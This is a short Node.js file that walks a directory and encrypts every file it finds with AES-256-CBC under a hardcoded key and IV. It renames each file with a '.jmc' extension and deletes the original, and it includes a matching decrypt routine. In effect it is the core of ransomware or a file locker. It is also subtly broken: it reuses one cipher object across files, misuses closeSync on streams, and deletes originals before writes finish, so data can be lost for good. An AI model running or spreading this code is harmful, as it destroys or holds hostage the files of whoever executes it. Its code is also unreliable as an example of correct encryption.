var fs = require('fs');
const crypto = require('crypto');
var key = Buffer.from("bRuD5WYw5wda6jHRnyLlM6wt2vteuiniQBqE70nAuhU=","base64"); //Hardcoded key
var iv = Buffer.from("ja9hq8lx2kDMLpTEn3ErSg==","base64"); //Hardcoded iv
var walk = require('walk');




function encrypt(file) {
    var files = []
    var walker = walk.walk(file, { followLinks: false });
    // @ts-ignore
    walker.on('file', function (root, stat, next) {
        // Add this file to the list of files
        files.push(root + '/' + stat.name);
        next();
    });
    // @ts-ignore
    walker.on('end', function () {
        var cipher = crypto.createCipheriv('aes-256-cbc', key,iv);
        for (var file of files) {
            try{
                if(file.endsWith(".jmc")) continue;
                console.warn(file)
                var filein = fs.createReadStream(file);
                var fileout = fs.createWriteStream(file + ".jmc");
                filein.pipe(cipher).pipe(fileout)
                fs.unlink(file, (err) => { console.log(err) });
                fs.closeSync(filein);
                fs.closeSync(fileout)
            }catch(error){
                console.log("Error:: ",error)
            }
        }
        
        console.log("Encryption Successful");
    })
}

function decrypt(file) {
    
    var files = []
    var walker = walk.walk(file, { followLinks: false });
    // @ts-ignore
    walker.on('file', function (root, stat, next) {
        // Add this file to the list of files
        files.push(root + '/' + stat.name);
        next();
    });
    // @ts-ignore
    walker.on('end', function () {
        var cipher = crypto.createDecipheriv('aes-256-cbc', key,iv);
        for (var file of files) {
            if(!file.endsWith(".jmc")) continue;
            var filein = fs.createReadStream(file);
            var fileout = fs.createWriteStream(file.replace(".jmc", ""));
            filein.pipe(cipher).pipe(fileout)
            fs.unlink(file, (err) => { console.log(err) });
            fs.closeSync(filein);
            fs.closeSync(fileout)
        }
        console.log('Decryption Successful');

    });
}
